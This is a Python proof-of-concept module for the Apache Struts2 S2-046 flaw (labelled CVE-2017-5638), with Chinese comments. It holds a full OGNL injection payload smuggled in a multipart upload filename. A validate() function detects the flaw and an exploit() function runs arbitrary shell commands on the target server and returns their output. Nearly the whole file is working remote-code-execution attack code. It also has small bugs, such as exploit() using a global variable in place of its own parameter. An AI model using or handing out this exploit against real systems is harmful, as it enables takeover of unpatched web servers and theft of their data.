# -*- coding: utf-8 -*-
# Add: 20171008
# Affected Software: Struts 2.3.5 - Struts 2.3.31, Struts 2.5 - Struts 2.5.10
# CVE Identifier: CVE-2017-5638
import os
import requests
from scripts.poc.poc_interface import PocInterface


class Struct2_046(PocInterface):
    '''
        Structs2-046 漏洞验证及利用实现
    '''

    def validate(self, url):
        '''
        验证指定url是否存在structs2_046漏洞
        :param url: 需要验证的url地址
        :return: True-存在漏洞，False-不存在漏洞
        '''
        header = {'Content-Length': '1000000000', 'Cache-Control': 'max-age=0', 'Upgrade-Insecure-Requests': '1',
                  'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36',
                  'Content-Type': 'multipart/form-data; boundary=----WebKitFormBoundaryXd004BVJN9pBYBL2',
                  'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
                  }
        a = "%{(#nike='multipart/form-data')" \
            ".(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)" \
            ".(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container'])" \
            ".(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class))" \
            ".(#ognlUtil.getExcludedPackageNames().clear())" \
            ".(#ognlUtil.getExcludedClasses().clear())" \
            ".(#context.setMemberAccess(#dm))))" \
            ".(#iswin=(@java.lang.System@getProperty('os.name')" \
            ".toLowerCase().contains('win')))" \
            ".(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd}))" \
            ".(#p=new java.lang.ProcessBuilder(#cmds))" \
            ".(#p.redirectErrorStream(true)).(#process=#p.start())" \
            ".(#ros=(@org.apache.struts2.ServletActionContext@getResponse()" \
            ".getOutputStream()))" \
            ".(# ros.println(102*102*102*99))" \
            ".(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros))" \
            ".(#ros.flush())}\x00b"
        path = os.path.split(os.path.realpath(__file__))[0]
        files = {"upload": (a, open(os.path.join(path, "s2-046-exp.txt"), 'rb'), "text/plain")
                 }
        try:
            r = requests.post(url, files=files)
            if "105059592" in r.text:
                return True
            else:
                return False
        except Exception as e:
            return False

    def exploit(self, url, cmd):
        '''
        对存在Struct2_46漏洞的主机实现任意命令执行
        :param url: 目标URL
        :param cmd: 需要执行的指令
        :return: 执行后的返回页面内容
        '''
        header = {'Content-Length': '1000000000', 'Cache-Control': 'max-age=0', 'Upgrade-Insecure-Requests': '1',
                  'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36',
                  'Content-Type': 'multipart/form-data; boundary=----WebKitFormBoundaryXd004BVJN9pBYBL2',
                  'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
                  }
        a = "%{(#nike='multipart/form-data')" \
            ".(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)" \
            ".(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container'])" \
            ".(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class))" \
            ".(#ognlUtil.getExcludedPackageNames().clear())" \
            ".(#ognlUtil.getExcludedClasses().clear())" \
            ".(#context.setMemberAccess(#dm))))" \
            ".(#cmd='whoami')" \
            ".(#iswin=(@java.lang.System@getProperty('os.name')" \
            ".toLowerCase().contains('win')))" \
            ".(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd}))" \
            ".(#p=new java.lang.ProcessBuilder(#cmds))" \
            ".(#p.redirectErrorStream(true)).(#process=#p.start())" \
            ".(#ros=(@org.apache.struts2.ServletActionContext@getResponse()" \
            ".getOutputStream()))" \
            ".(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros))" \
            ".(#ros.flush())}\x00b"
        a = a.replace('whoami', command)
        path = os.path.split(os.path.realpath(__file__))[0]
        files = {"upload": (a, open(os.path.join(path, "s2-046-exp.txt"), 'rb'), "text/plain")
                 }
        try:
            r = requests.post(url, files=files)
            return r.text
        except Exception as e:
            return "None"


if __name__ == '__main__':
    # 检测地址
    url = "http://localhost"
    # 执行命令
    command = "whoami"
    s = Struct2_046()
    if s.validate(url):
        s.exploit(url, command)
